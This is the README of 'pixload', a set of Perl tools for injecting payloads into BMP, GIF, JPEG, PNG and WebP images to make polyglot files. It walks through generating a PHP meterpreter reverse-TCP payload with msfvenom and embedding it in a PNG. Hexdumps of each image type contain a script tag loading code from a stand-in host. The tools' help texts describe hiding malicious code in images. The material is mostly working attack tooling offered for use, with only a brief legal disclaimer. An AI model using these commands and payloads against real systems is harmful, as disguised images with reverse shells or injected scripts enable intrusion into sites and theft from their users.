# pixload -- Image Payload Creating tools

## DESCRIPTION

Set of tools for ~~hiding backdoors~~ creating/injecting payload into images.

The following image types are currently supported: BMP, GIF, JPG, PNG, WebP.

#### about

Useful references for better understanding of `pixload` and its use-cases:

- [Bypassing CSP using polyglot JPEGs](https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs)

- [Hacking group using Polyglot images to hide malvertising attacks](https://web.archive.org/web/20190226193728/https://devcondetect.com/blog/2019/2/24/hacking-group-using-polyglot-images-to-hide-malvertsing-attacks)

- [Encoding Web Shells in PNG IDAT chunks](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

- [An XSS on Facebook via PNGs & Wonky Content Types](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)

- [Revisiting XSS payloads in PNG IDAT chunks](https://www.adamlogue.com/revisiting-xss-payloads-in-png-idat-chunks/)

If you want to encode a payload in such a way that the resulting binary blob is
both valid x86 shellcode and a valid image file, I recommend you to look
[here](https://web.archive.org/web/20201008001325/https://warroom.securestate.com/bmp-x86-polyglot/)
and
[here](https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/x86/bmp_polyglot.rb).

#### msfvenom

If you want to inject a metasploit payload, you have to do something like this:

1. Create metasploit payload (i.e. php).
```sh
$ msfvenom -p php/meterpreter_reverse_tcp \
	LHOST=192.168.0.1 LPORT=31337 -f raw 2>/dev/null > payload.php
```

2. Edit `payload.php` if needed.

3. Inject `payload.php` into the image (i.e. png).
```sh
$ pixload-png --payload "$(cat payload.php)" payload.png
```

## SETUP

##### Dependencies

The following Perl modules are required:

  * GD

  * Image::ExifTool

  * String::CRC32

On `Debian-based` systems install these packages:

```sh
sudo apt install libgd-perl libimage-exiftool-perl libstring-crc32-perl
```

On `FreeBSD` and `DragonFlyBSD` install these packages:
```sh
doas pkg install p5-GD p5-Image-ExifTool p5-String-CRC32
```

On `OSX` please refer to [this workaround](https://github.com/sighook/pixload/issues/3)
(thnx 2 @iosdec).

##### Build and Install

```sh
make install
```

#### Docker

```sh
docker build -t pixload .
docker run -v "$(pwd):/pixload" -it --rm pixload
```

## TOOLS

### pixload-bmp

##### Help

```sh
$ pixload-bmp --help
```

```
Usage: pixload-bmp [OPTION]... FILE
Hide Payload/Malicious Code in BMP Images.

Mandatory arguments to long options are mandatory for short options too.
  -P, --payload STRING   set payload for injection
  -v, --version          print version and exit
  -h, --help             print help and exit

If the output FILE already exists, then payload will be injected into this
existing file. Otherwise, the new one will be created.
```

##### Example

```sh
$ pixload-bmp payload.bmp
```

```
...... BMP Payload Creator/Injector ......
..........................................
... https://github.com/sighook/pixload ...
..........................................

[>] Generating output file
[✔] File saved to: payload.bmp

[>] Injecting payload into payload.bmp
[✔] Payload was injected successfully

payload.bmp: PC bitmap, OS/2 1.x format, 1 x 1 x 24, cbSize 10799, bits offset 26

00000000  42 4d 2f 2a 00 00 00 00  00 00 1a 00 00 00 0c 00  |BM/*............|
00000010  00 00 01 00 01 00 01 00  18 00 00 00 ff 00 2a 2f  |..............*/|
00000020  3d 31 3b 3c 73 63 72 69  70 74 20 73 72 63 3d 2f  |=1;<script src=/|
00000030  2f 65 78 61 6d 70 6c 65  2e 63 6f 6d 3e 3c 2f 73  |/example.com></s|
00000040  63 72 69 70 74 3e 3b                              |cript>;|
00000047
```

See [pixload-bmp(1)](https://github.com/sighook/pixload/blob/master/pixload-bmp.1.pod)
manual page for more information.

### pixload-gif

##### Help

```sh
$ pixload-gif --help
```

```
Usage: pixload-gif [OPTION]... FILE
Hide payload/malicious code in GIF images.

Mandatory arguments to long options are mandatory for short options too.
  -W, --pixelwidth  INTEGER   (has no effect)
                              set pixel width for the new image (default: 10799)
  -H, --pixelheight INTEGER   set pixel height for the new image (default: 32)
  -P, --payload     STRING    set payload for injection
  -v, --version               print version and exit
  -h, --help                  print help and exit

The option -W, --pixelwidth has no effect since pixload-gif rewrites
pixel width bytes with "/*" characters, to prepare the polyglot gif image.

If the output FILE already exists, then the payload will be injected into this
existing file. Otherwise, the new one will be created with specified pixels
wide.
```

##### Example

```sh
$ pixload-gif payload.gif
```

```
...... GIF Payload Creator/Injector ......
..........................................
... https://github.com/sighook/pixload ...
..........................................

[>] Generating output file
[✔] File saved to: payload.gif

[>] Injecting payload into payload.gif
[✔] Payload was injected successfully

payload.gif: GIF image data, version 87a, 10799 x 32

00000000  47 49 46 38 37 61 2f 2a  20 00 80 00 00 04 02 04  |GIF87a/* .......|
00000010  00 00 00 2c 00 00 00 00  20 00 20 00 00 02 1e 84  |...,.... . .....|
00000020  8f a9 cb ed 0f a3 9c b4  da 8b b3 de bc fb 0f 86  |................|
00000030  e2 48 96 e6 89 a6 ea ca  b6 ee 0b 9b 05 00 3b 2a  |.H............;*|
00000040  2f 3d 31 3b 3c 73 63 72  69 70 74 20 73 72 63 3d  |/=1;<script src=|
00000050  2f 2f 65 78 61 6d 70 6c  65 2e 63 6f 6d 3e 3c 2f  |//example.com></|
00000060  73 63 72 69 70 74 3e 3b                           |script>;|
00000068
```
See [pixload-gif(1)](https://github.com/sighook/pixload/blob/master/pixload-gif.1.pod)
manual page for more information.

### pixload-jpg

##### Help

```sh
$ pixload-jpg --help
```

```
Usage: pixload-jpg [OPTION]... FILE
Hide Payload/Malicious Code in JPEG images.

Mandatory arguments to long options are mandatory for short options too.
  -S, --section COM|DQT         set section for payload injection
  -P, --payload STRING          set payload for injection
  -v, --version                 print version and exit
  -h, --help                    print help and exit

If the output FILE already exists, then payload will be injected into this
existing file. Otherwise, the new one will be created.
```

##### Examples

1. Inject payload into comment section:

```sh
$ pixload-jpg -S com payload.jpg
```

```
..... JPEG Payload Creator/Injector ......
..........................................
... https://github.com/sighook/pixload ...
..........................................

[>] Generating output file
[✔] File saved to: payload.jpg

[>] Injecting payload into COMMENT
[✔] Payload was injected successfully

payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1

00000000  ff d8 ff fe 00 25 3c 73  63 72 69 70 74 20 73 72  |.....%<script sr|
00000010  63 3d 2f 2f 65 78 61 6d  70 6c 65 2e 63 6f 6d 3e  |c=//example.com>|
00000020  3c 2f 73 63 72 69 70 74  3e ff db 00 43 00 01 01  |</script>...C...|
00000030  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|
*
00000060  01 01 01 01 01 01 01 01  01 01 01 01 01 01 ff c2  |................|
00000070  00 0b 08 00 01 00 01 01  01 11 00 ff c4 00 14 00  |................|
00000080  01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000090  03 ff da 00 08 01 01 00  00 00 01 3f ff d9        |...........?..|
0000009e
```

2. Inject payload into DQT table:

```sh
$ pixload-jpg -S dqt payload.jpg
```

```
..... JPEG Payload Creator/Injector ......
..........................................
... https://github.com/sighook/pixload ...
..........................................

[>] Generating output file
[✔] File saved to: payload.jpg

[>] Injecting payload into DQT table
[✔] Payload was injected succesfully

payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1

00000000  ff d8 ff db 00 43 00 01  01 01 01 01 01 01 01 01  |.....C..........|
00000010  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|
00000020  01 01 01 01 3c 73 63 72  69 70 74 20 73 72 63 3d  |....<script src=|
00000030  2f 2f 65 78 61 6d 70 6c  65 2e 63 6f 6d 3e 3c 2f  |//example.com></|
00000040  73 63 72 69 70 74 3e ff  c2 00 0b 08 00 01 00 01  |script>.........|
00000050  01 01 11 00 ff c4 00 14  00 01 00 00 00 00 00 00  |................|
00000060  00 00 00 00 00 00 00 00  00 03 ff da 00 08 01 01  |................|
00000070  00 00 00 01 3f ff d9 01  01 11 00 ff c4 00 14 00  |....?...........|
00000080  01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000090  03 ff da 00 08 01 01 00  00 00 01 3f ff d9        |...........?..|
0000009e
```

See [pixload-jpg(1)](https://github.com/sighook/pixload/blob/master/pixload-jpg.1.pod)
for more information.

### pixload-png

##### Help

```sh
$ pixload-png --help
```

```
Usage: pixload-png [OPTION]... FILE
Hide Payload/Malicious Code in PNG Images.

Mandatory arguments to long options are mandatory for short options too.
  -W, --pixelwidth  INTEGER   set pixel width for the new image (default: 32)
  -H, --pixelheight INTEGER   set pixel height for the new image (default: 32)
  -P, --payload STRING        set payload for injection
  -v, --version               print version and exit
  -h, --help                  print help and exit

If the output FILE already exists, then payload will be injected into this
existing file. Else, the new one will be created with specified pixels wide.
```

##### Example

```sh
$ pixload-png payload.png
```

```
...... PNG Payload Creator/Injector ......
..........................................
... https://github.com/sighook/pixload ...
..........................................

[>] Generating output file
[✔] File saved to: payload.png

[>] Injecting payload into payload.png

[+] Chunk size: 13
[+] Chunk type: IHDR
[+] CRC: fc18eda3
[+] Chunk size: 9
[+] Chunk type: pHYs
[+] CRC: 952b0e1b
[+] Chunk size: 25
[+] Chunk type: IDAT
[+] CRC: c8a288fe
[+] Chunk size: 0
[+] Chunk type: IEND

[>] Inject payload to the new chunk: 'pUnk'
[✔] Payload was injected successfully

payload.png: PNG image data, 32 x 32, 8-bit/color RGB, non-interlaced

00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 00 00 20 00 00 00 20  08 02 00 00 00 fc 18 ed  |... ... ........|
00000020  a3 00 00 00 09 70 48 59  73 00 00 0e c4 00 00 0e  |.....pHYs.......|
00000030  c4 01 95 2b 0e 1b 00 00  00 19 49 44 41 54 48 89  |...+......IDATH.|
00000040  ed c1 31 01 00 00 00 c2  a0 f5 4f ed 61 0d a0 00  |..1.......O.a...|
00000050  00 00 6e 0c 20 00 01 c8  a2 88 fe 00 00 00 00 49  |..n. ..........I|
00000060  45 4e 44 ae 42 60 82 00  00 00 00 00 00 00 00 00  |END.B`..........|
00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000000c0  00 23 50 55 6e 4b 3c 73  63 72 69 70 74 20 73 72  |.#PUnK<script sr|
000000d0  63 3d 2f 2f 65 78 61 6d  70 6c 65 2e 63 6f 6d 3e  |c=//example.com>|
000000e0  3c 2f 73 63 72 69 70 74  3e eb fd 2e 9f 00 49 45  |</script>.....IE|
000000f0  4e 44                                             |ND|
000000f2
```

See [pixload-png(1)](https://github.com/sighook/pixload/blob/master/pixload-png.1.pod)
manual page for more information.

### pixload-webp

##### Help

```sh
$ pixload-webp --help
```

```
Usage: pixload-webp [OPTION]... FILE
Hide payloads/malicious code in WebP images.

Mandatory arguments to long options are mandatory for short options too.
  -P, --payload STRING   set payload for injection
  -v, --version          print version and exit
  -h, --help             print help and exit

Currently, there is no possibility to inject the payload into an existing
WebP image. Only the new (minimal) WebP image will be created and your
payload will be injected into. If the output FILE already exists, the
payload will be injected into the existing image, but this image will be
corrupted.
```

##### Example

```sh
$ pixload-webp payload.webp
```

```
..... WebP Payload Creator/Injector ......
..........................................
... https://github.com/sighook/pixload ...
..........................................

[>] Generating output file
[✔] File saved to: payload.webp

[>] Injecting payload into payload.webp
[✔] Payload was injected successfully

payload.webp: RIFF (little-endian) data, Web/P image

00000000  52 49 46 46 2f 2a 00 00  57 45 42 50 56 50 38 4c  |RIFF/*..WEBPVP8L|
00000010  ff ff ff 00 2f 00 00 00  10 07 10 11 11 88 88 fe  |..../...........|
00000020  07 00 2a 2f 3d 31 3b 3c  73 63 72 69 70 74 20 73  |..*/=1;<script s|
00000030  72 63 3d 2f 2f 65 78 61  6d 70 6c 65 2e 63 6f 6d  |rc=//example.com|
00000040  3e 3c 2f 73 63 72 69 70  74 3e 3b                 |></script>;|
0000004b
```

See [pixload-webp(1)](https://github.com/sighook/pixload/blob/master/pixload-webp.1.pod)
manual page for more information.

## LICENSE

WTFPL version 2.
See [LICENSE](https://github.com/sighook/pixload/blob/master/LICENSE)
for more information.

## LEGAL DISCLAIMER

The author does not hold any responsibility for the bad use
of this tool, remember that attacking targets without prior
consent is illegal and punished by law.

## DONATIONS

- BTC: `bc1qj4g98svq6qh3q2ap37v52nsvusa76c3cnmcdmx`

- PAYPAL: `alexandr.savca89@gmail.com`

Highly appreciated.


<!-- vim:sw=2:ts=2:sts=2:et:cc=80
End of file. -->
